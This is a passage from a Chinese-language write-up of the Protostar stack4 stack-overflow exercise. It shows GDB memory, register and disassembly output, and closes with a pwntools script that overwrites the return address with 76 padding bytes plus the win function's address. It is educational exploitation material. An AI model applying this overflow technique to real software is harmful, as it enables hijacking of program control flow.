0xffffd01c:     0x08048340      0x00000000      0xf7fdbe90      0xf7c23809
0xffffd02c:     0xf7ffcff4      0x00000001      0x08048340      0x00000000
0xffffd03c:     0x08048361      0x08048408      0x00000001      0xffffd064
0xffffd04c:     0x08048430      0x08048420      0xf7fcecd0      0xffffd05c
0xffffd05c:     0xf7ffda20      0x00000001      0xffffd237      0x00000000
0xffffd06c:     0xffffd251      0xffffd260      0xffffd274      0xffffd297
0xffffd07c:     0xffffd2cd      0xffffd2ee      0xffffd2fb      0xffffd319
0xffffd08c:     0xffffd335      0xffffd351      0xffffd361      0xffffd372
0xffffd09c:     0xffffd37c      0xffffd389      0xffffd3a8      0xffffd44a
(gdb) n
win () at stack4/stack4.c:7
7       in stack4/stack4.c
(gdb) i r
eax            0xffffcf60          -12448
ecx            0xf7e1f9c4          -136185404
edx            0x0                 0
ebx            0xf7e1dff4          -136192012
esp            0xffffcfb0          0xffffcfb0
ebp            0x0                 0x0
esi            0x8048430           134513712
edi            0xf7ffcba0          -134231136
eip            0x80483f4           0x80483f4 <win>
eflags         0x246               [ PF ZF IF ]
cs             0x23                35
ss             0x2b                43
ds             0x2b                43
es             0x2b                43
fs             0x0                 0
gs             0x63                99
(gdb) x/10i $eip
=> 0x80483f4 <win>:     push   ebp
   0x80483f5 <win+1>:   mov    ebp,esp
   0x80483f7 <win+3>:   sub    esp,0x18
   0x80483fa <win+6>:   mov    DWORD PTR [esp],0x80484e0
   0x8048401 <win+13>:  call   0x804832c <puts@plt>
   0x8048406 <win+18>:  leave
   0x8048407 <win+19>:  ret
   0x8048408 <main>:    push   ebp
   0x8048409 <main+1>:  mov    ebp,esp
   0x804840b <main+3>:  and    esp,0xfffffff0
(gdb) n
win () at stack4/stack4.c:8
8       in stack4/stack4.c
(gdb) n
code flow successfully changed
9       in stack4/stack4.c
```

从上述过程中，我们可以看到，在执行ret指令前，我们将位于栈顶的返回地址 `0xf7c237c5`修改为`0x80483f4`，然后成功跳转到了win函数并输出了我们的期望目标：`code flow successfully changed`

* * *

**Exp如下：**

```
# -*- coding:utf-8 -*-

from pwn import *

sh = process("./stack4")

ret_addr  = 0x80483f4

payload  = b'a'*76

payload += p32(ret_addr)

sh.sendline(payload)

print(sh.recvline())
```

**BinGo!!!**

![9414b43f92956162a95c3e31c5a7029a.png](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/9414b43f92956162a95c3e31c5a7029a.png)

&nbsp;